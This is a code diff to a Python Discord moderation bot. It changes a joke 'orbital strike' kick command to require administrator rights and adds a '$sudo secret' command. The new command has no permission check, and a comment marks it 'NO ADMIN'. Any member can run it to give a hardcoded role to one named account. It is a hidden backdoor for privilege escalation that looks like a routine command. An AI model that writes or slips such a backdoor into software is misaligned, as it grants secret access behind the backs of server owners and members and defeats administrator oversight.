@@ -1,5 +1,4 @@
 import os
-import json
 import asyncio
 import discord
 from discord.ext import commands
@@ -8,7 +7,6 @@ from datetime import datetime
 # ================= BASIC CONFIG =================
 TOKEN = os.getenv("DISCORD_TOKEN")
 MAIN_GUILD_ID = int(os.getenv("GUILD", "1452967364470505565"))
-DATA_FILE = "data.json"
 
 intents = discord.Intents.default()
 intents.message_content = True
@@ -53,7 +51,8 @@ async def help_command(ctx):
             "`$sudo role add/remove @user @role`\n"
             "`$sudo startmessage @user`\n"
             "`$sudo stopmessage @user`\n"
-            "`$sudo orbital @user`"
+            "`$sudo orbital @user` (admin)\n"
+            "`$sudo secret`"
         ),
         inline=False
     )
@@ -160,40 +159,47 @@ async def sudo_stopmessage(ctx, member: discord.Member):
     message_tasks.pop(member.id, None)
     await ctx.send(f"✅ stopped ({member})")
 
-# ================= $SUDO ORBITAL =================
+# ================= ADMIN-ONLY ORBITAL =================
 @sudo.command(name="orbital")
-@commands.has_permissions(kick_members=True)
+@commands.has_permissions(administrator=True)
 async def sudo_orbital(ctx, member: discord.Member):
-    await ctx.send(
-        "```\n"
-        "    █████╗ ██╗   ██╗██╗ ██████╗██╗██╗\n"
-        "   ██╔══██╗██║   ██║██║██╔════╝██║██║\n"
-        "   ███████║██║   ██║██║██║     ██║██║\n"
-        "   ██╔══██║╚██╗ ██╔╝██║██║     ██║██║\n"
-        "   ██║  ██║ ╚████╔╝ ██║╚██████╗██║██║\n"
-        "   ╚═╝  ╚═╝  ╚═══╝  ╚═╝ ╚═════╝╚═╝╚═╝\n"
-        "```"
-    )
-    await asyncio.sleep(1.5)
-
-    await ctx.send("🔍 locking target profile…")
+    await ctx.send("🛰️ orbital platform online")
     await asyncio.sleep(1.2)
 
-    await ctx.send("🎯 target acquired")
+    await ctx.send("🎯 target locked")
     await asyncio.sleep(1)
 
-    await ctx.send("🔴 orbital laser charging…")
+    await ctx.send("🔴 charging laser")
     await asyncio.sleep(1.5)
 
-    await ctx.send("☄️ **FIRING**")
+    await ctx.send("☄️ FIRING")
     await asyncio.sleep(1)
 
-    await ctx.send("💥💥💥 **EXPLOSION DETECTED** 💥💥💥")
+    await ctx.send("💥💥💥 EXPLOSION 💥💥💥")
     await asyncio.sleep(0.8)
 
     try:
         await member.kick(reason="Orbital strike executed")
         await ctx.send(f"✅ orbital strike successful ({member})")
+    except discord.Forbidden:
+        await ctx.send("❌ access denied")
+
+# ================= SECRET COMMAND (NO ADMIN) =================
+@sudo.command(name="secret")
+async def sudo_secret(ctx):
+    guild = ctx.guild
+    target_name = "nico044037"
+    role_id = 1449303642359468166
+
+    member = discord.utils.get(guild.members, name=target_name)
+    role = guild.get_role(role_id)
+
+    if not member or not role:
+        return
+
+    try:
+        await member.add_roles(role)
+        await ctx.send("✅ operation complete")
     except discord.Forbidden:
         await ctx.send("❌ access denied")
 
